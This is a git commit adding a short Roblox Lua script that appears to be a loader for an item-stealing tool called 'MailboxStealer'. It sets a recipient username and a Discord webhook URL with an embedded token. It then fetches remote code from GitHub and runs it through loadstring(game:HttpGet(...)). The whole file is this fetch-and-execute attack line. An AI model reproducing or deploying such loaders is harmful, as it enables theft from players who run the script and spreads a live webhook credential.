5f4fa05a007bc01a38e67931c0a282a48a3ba641
WhatScripts <127566395+WhatScripts@users.noreply.github.com>
2023-04-07 11:44:22 +0200

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,4 @@
+UserName = "TestowanieSkrypta"
+WebHook = "https://discord.com/api/webhooks/1086641816239091774/3kjm2tE_oSO4Omq3WPcCdBdlRpG1N8Z8EBQZc6ZwL6tynDOjd0aJCVEIpmBYhlmiMs2i"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatScripts/MailboxStealer/main/MailboxStealerSimonHub.lua", true))()
